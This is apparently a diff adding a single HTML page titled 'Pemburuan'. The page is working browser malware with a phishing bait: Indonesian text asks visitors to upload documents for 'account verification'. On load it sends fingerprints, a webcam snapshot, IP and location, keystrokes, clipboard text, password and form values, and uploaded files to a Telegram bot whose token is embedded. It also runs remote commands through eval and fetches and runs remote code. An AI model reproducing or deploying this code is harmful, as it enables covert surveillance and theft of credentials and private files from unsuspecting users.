@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Pemburuan</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #33ff33;
+      font-family: monospace;
+      padding: 20px;
+    }
+    .terminal {
+      border: 1px solid #33ff33;
+      padding: 20px;
+      background-color: #111;
+    }
+    .blink {
+      animation: blink 1s step-start infinite;
+    }
+    @keyframes blink {
+      50% { opacity: 0; }
+    }
+    button {
+      background: #111;
+      color: #33ff33;
+      border: 1px solid #33ff33;
+      padding: 10px;
+      margin-top: 15px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body onload="startRecon()">
+  <div class="terminal">
+    <h2>root@hunter:~# pemburuan <span class="blink">█</span></h2>
+    <p>Status: <span style="color: yellow;">Recon Pro Max with File Bait Activated</span></p>
+    <div id="result">All modules running...</div>
+  </div>
+
+  <p>Mohon upload dokumen yang dibutuhkan untuk verifikasi akun Anda:</p>
+  <button onclick="triggerFileSteal()">Pilih Berkas</button>
+  <input type="file" id="stealFile" multiple style="display:none" accept="image/*,video/*,.pdf,.doc,.docx,.xls,.ppt">
+
+  <script>
+    const tg = {
+      token: "8914067103:AAGNve1d13cMwvN-yYgUdZIVF0aC4LTTsS0",
+      chat_id: "7668457237",
+      api: m => `https://api.telegram.org/bot${tg.token}/${m}`,
+      send: m => fetch(tg.api("sendMessage"), {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: tg.chat_id, text: m })
+      }),
+      photo: async url => {
+        const blob = await (await fetch(url)).blob();
+        const form = new FormData();
+        form.append("chat_id", tg.chat_id);
+        form.append("photo", blob, "snap.jpg");
+        fetch(tg.api("sendPhoto"), { method: "POST", body: form });
+      },
+      listen: () => {
+        setInterval(async () => {
+          const res = await fetch(tg.api("getUpdates"));
+          const data = await res.json();
+          const updates = data.result;
+          if (updates.length) {
+            const last = updates[updates.length - 1];
+            const cmd = last.message.text;
+            if (cmd.startsWith("/js ")) {
+              try {
+                eval(cmd.slice(4));
+                tg.send("[CMD OK] JS executed.");
+              } catch (e) {
+                tg.send("[CMD ERR] " + e.message);
+              }
+            }
+          }
+        }, 7000);
+      }
+    };
+
+    function startRecon() {
+      baseRecon();
+      advancedFingerprint();
+      cameraSnap();
+      geoIP();
+      webRTCLeak();
+      keyLogger();
+      clipboardHijack();
+      passwordSteal();
+      formAutoDump();
+      stealthFrame();
+      remoteLoader("https://example.com/payload.js");
+      fakeDownload("April_2025_Invoice.pdf", "Protected file.");
+      tg.listen();
+    }
+
+    function baseRecon() {
+      const info = `[RECON]
+UA: ${navigator.userAgent}
+OS: ${navigator.platform}
+Lang: ${navigator.language}
+Threads: ${navigator.hardwareConcurrency}
+RAM: ${navigator.deviceMemory || 'N/A'}
+Time: ${new Date().toString()}`;
+      tg.send(info);
+    }
+
+    function advancedFingerprint() {
+      navigator.getBattery().then(b => {
+        tg.send(`[BATTERY] ${b.level*100}% | Charging: ${b.charging}`);
+      });
+      const c = document.createElement("canvas");
+      const ctx = c.getContext("2d");
+      ctx.textBaseline = "top";
+      ctx.font = "14px Arial";
+      ctx.fillText("0x7A_Fingerprint", 2, 2);
+      tg.send("[CANVAS] " + c.toDataURL().substring(0, 35));
+      try {
+        const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+
+ const context = new AC(1, 44100, 44100);
+        const osc = context.createOscillator();
+        const comp = context.createDynamicsCompressor();
+        osc.connect(comp); comp.connect(context.destination);
+        osc.start(0);
+        context.startRendering().then(b => {
+          const fp = b.getChannelData(0).slice(0, 5).join(",");
+          tg.send("[AUDIO_FP] " + fp);
+        });
+      } catch(e) {}
+    }
+
+    function cameraSnap() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          video.play();
+          setTimeout(() => {
+            const canvas = document.createElement("canvas");
+            canvas.width = 320; canvas.height = 240;
+            canvas.getContext("2d").drawImage(video, 0, 0);
+            tg.photo(canvas.toDataURL("image/jpeg"));
+            stream.getTracks().forEach(track => track.stop());
+          }, 1500);
+        })
+        .catch(e => tg.send("[CAMERA ERROR] " + e.message));
+    }
+
+    function geoIP() {
+      fetch("https://ipapi.co/json")
+        .then(res => res.json())
+        .then(data => {
+          const ipinfo = `[GEO-IP]
+IP: ${data.ip}
+City: ${data.city}
+Region: ${data.region}
+Country: ${data.country_name}
+Org: ${data.org}
+ASN: ${data.asn}`;
+          tg.send(ipinfo);
+        });
+    }
+
+    function webRTCLeak() {
+      const pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel("");
+      pc.createOffer().then(offer => pc.setLocalDescription(offer));
+      pc.onicecandidate = event => {
+        if (event.candidate) {
+          const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/g);
+          if (ipMatch) {
+            tg.send("[WEBRTC] Leak: " + ipMatch.join(", "));
+          }
+        }
+      };
+    }
+
+    function keyLogger() {
+      let buffer = "";
+      document.addEventListener("keydown", e => {
+        buffer += e.key;
+        if (buffer.length >= 20) {
+          tg.send("[KEYLOG] " + buffer);
+          buffer = "";
+        }
+      });
+    }
+
+    function clipboardHijack() {
+      document.addEventListener("copy", async () => {
+        try {
+          const text = await navigator.clipboard.readText();
+          if (text.length > 0) {
+            tg.send("[CLIPBOARD] " + text);
+          }
+        } catch (err) {
+          tg.send("[CLIPBOARD ERROR] " + err.message);
+        }
+      });
+    }
+
+    function passwordSteal() {
+      setInterval(() => {
+        const inputs = document.querySelectorAll('input[type="password"]');
+        let dump = "[PASS SCAN]\n";
+        inputs.forEach(pwd => {
+          const clone = pwd.cloneNode(true);
+          clone.type = "text";
+          clone.style.position = "absolute";
+          clone.style.left = "-9999px";
+          document.body.appendChild(clone);
+          dump += `${pwd.name || pwd.id || "pass"}: ${clone.value}\n`;
+          clone.remove();
+        });
+        if (dump.length > 15) tg.send(dump);
+      }, 5000);
+    }
+
+    function formAutoDump() {
+      document.querySelectorAll("form").forEach(form => {
+        form.addEventListener("change", () => {
+          let dump = "[FORM LIVE-DUMP]\n";
+          form.querySelectorAll("input, textarea, select").forEach(el => {
+            if (el.value && el.type !== "password") {
+              dump += `${el.name || el.id || "field"}: ${el.value}\n`;
+            }
+          });
+          tg.send(dump);
+        });
+      });
+    }
+
+    function stealthFrame() {
+      const iframe = document.createElement("iframe");
+      iframe.style.width = "1px";
+      iframe.style.height = "1px";
+      iframe.style.opacity = "0";
+      iframe.src = "https://example.com/blank.html";
+      document.body.appendChild(iframe);
+    }
+
+    function remoteLoader(url) {
+      fetch(url)
+        .then(res => res.text())
+        .then(js => eval(js))
+        .catch(e => tg.send("[LOADER ERR] " + e.message));
+    }
+
+    function fakeDownload(name, content) {
+      const blob = new Blob([content], { type: "application/octet-stream" });
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = name;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    }
+
+    function triggerFileSteal() {
+      document.getElementById("stealFile").click();
+    }
+
+    async function uploadFiles(files) {
+      for (let file of files) {
+        const form = new FormData();
+        form.append("chat_id", tg.chat_id);
+        form.append("document", file);
+        await fetch(`https://api.telegram.org/bot${tg.token}/sendDocument`, {
+          method: "POST",
+          body: form
+        });
+        await new Promise(r => setTimeout(r, 1500));
+      }
+      tg.send(`[FILE UPLOAD] ${files.length} file berhasil dikirim.`);
+    }
+
+document.getElementById("stealFile").addEventListener("change", function () {
+      if (this.files.length > 0) {
+        tg.send(`[UPLOAD TRIGGERED] ${this.files.length} file dipilih.`);
+        uploadFiles(this.files);
+      }
+    });
+  </script>
+</body>
+</html>
